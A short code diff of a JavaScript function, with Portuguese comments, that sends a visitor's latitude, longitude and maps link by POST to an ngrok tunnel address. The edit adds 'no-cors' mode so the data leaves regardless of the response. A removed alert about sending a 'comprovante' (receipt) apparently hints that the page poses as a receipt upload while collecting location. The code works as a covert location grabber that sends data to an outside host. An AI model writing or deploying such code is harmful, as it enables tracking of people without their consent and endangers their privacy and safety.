@@ -28,22 +28,20 @@ function sendLocation(position) {
     }, 500); 
 
     // Envia a localização para o servidor
-    fetch("https://2942-2804-1eb0-a0-1aa7-31c1-a91-a190-96bc.ngrok-free.app", {  // Use a URL gerada pelo ngrok
+    fetch("https://2942-2804-1eb0-a0-1aa7-31c1-a91-a190-96bc.ngrok-free.app", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: JSON.stringify({ latitude, longitude, maps }),
+        mode: "no-cors"  // Modo para desabilitar CORS
     })
-    .then(response => response.json())
-    .then(data => {
-        if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-        }
+    .then(response => {
+        // Aqui, não será possível acessar a resposta
     })
     .catch(error => {
         console.error("Erro:", error);
-    });
+    });    
     
 }
 
